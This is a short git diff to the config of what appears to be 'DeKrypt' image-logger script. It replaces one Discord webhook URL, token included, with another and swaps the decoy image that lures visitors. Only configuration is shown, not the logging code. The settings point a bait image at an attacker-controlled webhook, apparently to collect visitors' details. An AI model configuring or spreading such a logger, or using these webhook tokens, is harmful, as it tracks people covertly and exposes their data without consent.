@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1516881183466721402/rqic6GsDzCjD8458_t5-Y67SaI22BchHuSSmgsMkUbyZ8vNL1vIymOCB-qMsnrr_XgHx",
-    "image": "https://minecraft-tutos.com/wp-content/uploads/2022/03/wallpaper-minecraft-steve-champs.jpeg", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1516885235822887076/Jm3vnjy35muZzb6H27KWAKRn4VGXun-z0sBtJS0kp1QapGAKqSRPUvNe_1TF_fUEkZmz",
+    "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
